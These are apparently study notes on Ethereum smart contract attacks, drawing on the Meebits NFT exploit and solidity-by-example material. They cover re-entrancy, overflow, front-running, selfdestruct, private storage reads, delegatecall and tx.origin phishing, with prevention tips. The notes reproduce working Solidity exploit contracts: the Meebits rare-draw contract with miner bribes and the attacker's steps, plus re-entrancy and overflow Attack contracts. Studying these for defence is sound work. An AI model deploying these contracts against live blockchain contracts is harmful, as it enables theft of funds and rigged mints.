# Smart contract security

## Attack - Cancel transaction if unfavorable draw
[Meebit NFT Exploit analysis](https://iphelix.medium.com/meebit-nft-exploit-analysis-c9417b804f89)

Contract with vulnerability if the attacker knows which ids are extra valuable.

```

   /**
     * Community grant minting.
     */
    function mintWithPunkOrGlyph(uint _createVia) external reentrancyGuard returns (uint) {
        require(communityGrant);
        require(!marketPaused);
        require(_createVia > 0 && _createVia <= 10512, "Invalid punk/glyph index.");
        require(creatorNftMints[_createVia] == 0, "Already minted with this punk/glyph");
        if (_createVia > 10000) {
            // It's a glyph
            // Compute the glyph ID
            uint glyphId = _createVia.sub(10000);
            // Make sure the sender owns the glyph
            require(IERC721(glyphs).ownerOf(glyphId) == msg.sender, "Not the owner of this glyph.");
        } else {
            // It's a punk
            // Compute the punk ID
            uint punkId = _createVia.sub(1);
            // Make sure the sender owns the punk
            require(Cryptopunks(punks).punkIndexToAddress(punkId) == msg.sender, "Not the owner of this punk.");
        }
        creatorNftMints[_createVia]++;
        return _mint(msg.sender, _createVia);
    }

    function _mint(address _to, uint createdVia) internal returns (uint) {
        require(_to != address(0), "Cannot mint to 0x0.");
        require(numTokens < TOKEN_LIMIT, "Token limit reached.");
        uint id = randomIndex();

        numTokens = numTokens + 1;
        _addNFToken(_to, id);

        emit Mint(id, _to, createdVia);
        emit Transfer(address(0), _to, id);
        return id;
    }

```

[Exploit contract](https://etherscan.io/address/0x270ff2308a29099744230de56e7b41c8ced46ffb)

```
pragma solidity 0.8.4;

interface IMeebits {
    function mintWithPunkOrGlyph(uint _createVia) external returns (uint);
}

contract Exploit {

    address private owner;
    mapping(uint => bool) internal meebitIds;
    IMeebits immutable meebits;
    
    constructor(address addr) {
        owner = msg.sender;
        meebits = IMeebits(addr);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not owner");
        _;
    }

    function deposit() public payable {}

    function addMeebit(uint meebitId) onlyOwner public {
        meebitIds[meebitId] = true;
    }
    
    function deleteMeebit(uint meebitId) onlyOwner public {
        meebitIds[meebitId] = false;
    }

    function mintMeebit(uint _createVia) public returns(uint){

        // Mint a new meebit with a punk or glyph
        uint id = meebits.mintWithPunkOrGlyph(_createVia);

        // Make sure it's a desired rare meebit
        require(meebitIds[id], "Not a rare meebit");
        
        // Pay miner bribe to include the block
        (bool success, ) = block.coinbase.call{value: 1 ether}("");
        require(success);
        return id;
    }

    function recover(address recipient, uint256 value, bytes memory args) onlyOwner public {
        (bool success, ) = recipient.call{ value: value }(args);
        require(success);
    }
    
}
}
```

Attacker would do the following:
1. Create contract with the official meebit contract as a parameter. Attacker address would now be set as owner
1. Call addMeebit for all the rare meebits he would accept
1. Call deposit in a transaction where message.value is 1 eth (this will be used to pay the miners later). This is then deposited to the contract address
1. Create transaction against mintMeebit. If the meebit returned from the official contract was not added from addMeebit, the require statement would roll back the transaction. If the transaction was on the list, he'd use ´block.coinbase.call´ to raise the gas provided for the transaction to 1ETH
1. Retrieve any extra deposited ETH to the contract via recover (10ETH was recovered by attacker)



## Attack - Re-entrancy
[https://solidity-by-example.org/hacks/re-entrancy/](https://solidity-by-example.org/hacks/re-entrancy/)

```
contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

Preventative techniques:
- Ensure all state changes happen before calling external contracts
- Use function modifiers that prevent re-entrancy

Example of attack:
- [The DAO Attack](https://www.coindesk.com/understanding-dao-hack-journalists)

## Attack - Overflow
[https://solidity-by-example.org/hacks/overflow/](https://solidity-by-example.org/hacks/overflow/)

```
contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        */
        timeLock.increaseLockTime(
            type(uint).max - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}
```

Preventative techniques:

- Use SafeMath to will prevent arithmetic overflow and underflow

## Attack - Front running
Transactions take some time before they are mined. An attacker can watch the transaction pool and send a transaction, have it included in a block before the original transaction. This mechanism can be abused to re-order transactions to the attacker's advantage.

```
1. Alice deploys FindThisHash with 10 Ether.
2. Bob finds the correct string that will hash to the target hash. ("Ethereum")
3. Bob calls solve("Ethereum") with gas price set to 15 gwei.
4. Eve is watching the transaction pool for the answer to be submitted.
5. Eve sees Bob's answer and calls solve("Ethereum") with a higher gas price
   than Bob (100 gwei).
6. Eve's transaction was mined before Bob's transaction.
   Eve won the reward of 10 ether.
``` 

Preventative techniques:

- use commit-reveal scheme
- use submarine send

## Attack - Self destruct
[https://solidity-by-example.org/hacks/self-destruct/](https://solidity-by-example.org/hacks/self-destruct/)
Selfdestruct allows a smartcontract to be deleted from Ethereum Virtual Machine. As a parameter to it, you pass the adress to receive it and this can cause issues to the adress receiving it.


Preventative techniques:
- Avoid using address(this).balance (use msg.value instead)

## Attack - Read private data
[https://solidity-by-example.org/hacks/accessing-private-data/](https://solidity-by-example.org/hacks/accessing-private-data/)
State variables can be read through web3, for example through ´web3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", 2, console.log)´

Preventative techniques:

- Don't store sensitive information on the blockchain

## Attack - Delegatecall
[https://solidity-by-example.org/hacks/delegatecall/](https://solidity-by-example.org/hacks/delegatecall/)
delegatecall is tricky to use and wrong usage or incorrect understanding can lead to devastating results.

Preventative techniques:

- Use stateless Library

## Phishing with tx.origin
[https://solidity-by-example.org/hacks/phishing-with-tx-origin/](https://solidity-by-example.org/hacks/phishing-with-tx-origin/)
If contract A calls B, and B calls C, in C msg.sender is B and tx.origin is A.

Preventative techniques:

- Use msg.sender instead of tx.origin

## Hiding Malicious Code with External Contract
[https://solidity-by-example.org/hacks/hiding-malicious-code-with-external-contract/](https://solidity-by-example.org/hacks/hiding-malicious-code-with-external-contract/)
In Solidity any address can be casted into specific contract, even if the contract at the address is not the one being casted.

```
contract Foo {
    Bar bar;

    constructor(address _bar) {
        bar = Bar(_bar);
    }
```

In the code above, there is no guarantee bar is of the class Bar. The owner calling the constructor could have passed another contract.

Preventative techniques: 

- Initialize a new contract inside the constructor
- Make the address of external contract public so that the code of the external contract can be reviewed
